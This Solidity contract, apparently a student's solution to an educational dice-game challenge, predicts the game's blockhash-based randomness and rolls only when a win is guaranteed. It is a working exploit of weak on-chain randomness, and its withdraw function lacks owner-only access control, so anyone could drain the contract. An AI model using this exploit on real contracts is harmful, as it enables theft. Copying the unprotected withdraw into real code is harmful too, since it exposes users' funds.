pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    uint256 public nonce = 0;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
     function withdraw(address _to, uint256 _amount) external {
        require(_to != address(0), "Cannot withdraw to the zero address");
        //check the input is not zero
        require(_amount <= address(this).balance, "Insufficient balance");
        // checking checking 

        payable(_to).transfer(_amount);
        
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
     function riggedRoll() external {
        // Ensure the contract has enough Ether to roll
        require(address(this).balance >= 0.002 ether, "Not enough ETH to roll");

        // Predict the roll using the same randomness logic as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

       
        // Only roll if the result is a winning number (0-5)
        if (roll > 5) {
            return;
        }
        diceGame.rollTheDice{value: 0.002 ether}();
    }
   
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}

 }
